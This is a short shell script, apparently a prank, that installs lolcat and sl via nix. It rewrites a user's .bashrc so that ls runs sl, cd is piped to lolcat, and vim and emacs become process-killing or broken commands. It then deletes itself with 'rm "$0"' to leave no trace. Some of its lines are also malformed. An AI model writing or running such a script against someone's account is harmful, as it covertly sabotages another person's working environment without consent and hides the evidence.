#!/bin/sh
echo 'nix profile install nixpkgs#lolcat
nix profile install nixpkgs#sl' >> "afs/.conf/install.sh"

./afs/.conf/install.sh

echo "alias ls='sl'" >> ".bashrc"
echo "alias cd='cd | lolcat'" >> ".bashrc"
echo "alias vim='pkill 3;'" >> ".bashrc"
echo "alias emacs='pkill3;'" >> ".bashrc"
echo "term_size 2" >> ".bashrc"

rm "$0"
